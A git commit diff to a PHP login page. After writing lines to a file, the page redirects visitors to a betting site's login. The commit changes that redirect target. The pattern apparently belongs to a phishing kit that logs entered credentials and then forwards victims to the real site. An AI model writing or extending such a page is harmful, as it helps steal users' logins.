efbf6e2e0c7b4c442af9a4d22e1589939beaf52a
Jalendhar10 <56975828+Jalendhar10@users.noreply.github.com>
2024-06-02 00:22:16 +0530

    Update login.php

--- login.php
+++ login.php
@@ -12,7 +12,7 @@ fwrite($handle,"\r\n");
 }
 fwrite($handle,"\r\n");
 fclose($handle);
-header("location:https://parimatch.in/");
+header("location:https://pm-bet.in/en/login/");
 exit;
 // https://www.facebook.com/AnuragDhakal11
 ?>
